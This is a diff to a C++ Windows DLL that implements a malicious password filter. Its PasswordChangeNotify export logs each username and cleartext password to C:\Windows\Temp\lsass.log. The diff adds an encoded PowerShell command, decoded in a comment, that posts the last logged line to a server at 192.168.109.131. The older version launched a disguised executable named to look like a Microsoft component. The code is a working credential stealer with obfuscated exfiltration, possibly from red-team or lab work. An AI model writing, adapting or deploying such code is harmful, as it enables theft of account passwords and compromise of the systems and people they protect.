@@ -164,22 +164,20 @@ extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICOD
     wchar_t singleNL = L'\n';
     UNICODE_STRING newline = { 2, 2, &singleNL };
 
-    PUNICODE_STRING temp1 = new UNICODE_STRING;
-    PUNICODE_STRING temp2 = new UNICODE_STRING;
-    PUNICODE_STRING fullString = new UNICODE_STRING;
-    catUTF16LEStr(uname, &colon, temp1);
-    catUTF16LEStr(password, &newline, temp2);
-    catUTF16LEStr(temp1, temp2, fullString);
-
-    free(temp1);
-    free(temp2);
-
-    writeToFile(fullString);
+    writeToFile(uname);
+    writeToFile(&colon);
+    writeToFile(password);
+    writeToFile(&newline);
 
     //call the other executable for networking
-    system(R"("C:\Program Files\Windows NT\MicrosoftCryptographicManager.exe")");
+    system(R"("powershell.exe -EncodedCommand "JABmAGkAbABlAFAAYQB0AGgAIAA9ACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAGwAcwBhAHMAcwAuAGwAbwBnACIAOwAkAHMAZQByAHYAZQByAFUAcgBsACAAPQAgACIAMQA5ADIALgAxADYAOAAuADEAMAA5AC4AMQAzADEALwBwAG8AcwB0ACIAOwAkAGwAYQBzAHQATABpAG4AZQAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAGYAaQBsAGUAUABhAHQAaAAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBMAGEAcwB0ACAAMQA7AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAkAHMAZQByAHYAZQByAFUAcgBsACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAEIAbwBkAHkAIAAkAGwAYQBzAHQATABpAG4AZQAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAIgB0AGUAeAB0AC8AcABsAGEAaQBuADsAIABjAGgAYQByAHMAZQB0AD0AdQB0AGYALQAxADYAbABlACIACgA=")");
 
-    free(fullString);
+    //above blob is this script
+    //$filePath = "C:\Windows\Temp\lsass.log"
+    //$serverUrl = "192.168.109.131/post"
+    //$lastLine = Get-Content -Path $filePath | Select-Object -Last 1
+    //Invoke-RestMethod -Uri $serverUrl -Method Post -Body $lastLine -ContentType "text/plain; charset=utf-16le"
+
 
     return 0;
 }
